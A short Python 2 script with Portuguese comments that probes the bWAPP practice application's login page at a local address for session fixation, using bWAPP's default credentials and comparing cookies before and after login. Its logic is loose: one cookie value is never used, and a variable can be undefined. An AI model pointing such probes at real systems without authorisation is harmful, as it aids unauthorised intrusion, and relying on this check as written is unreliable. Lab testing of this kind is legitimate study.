#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo tenta
  fazer o teste de
  cookie injection

  Modificado em 29 de dezembro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importantando as bibliotecas necessárias
import requests

url = 'http://192.168.1.163/bWAPP/login.php' # Site alvo ex: Bee Wapp Login 
req = requests.get(url)

if req.cookies:
	print req.cookies
	cookies = dict(admin='True')                             # login e senha
	cookie_req = requests.post(url, cookies=req.cookies, auth=('bee', 'bug')) # Colocar as credenciais aqui
	print 'Estado de cookie autenticado:', cookie_req.cookies

if req.cookies == cookie_req.cookies:
	print 'Identificação da vulnerabilidade de fixação de sessão'





















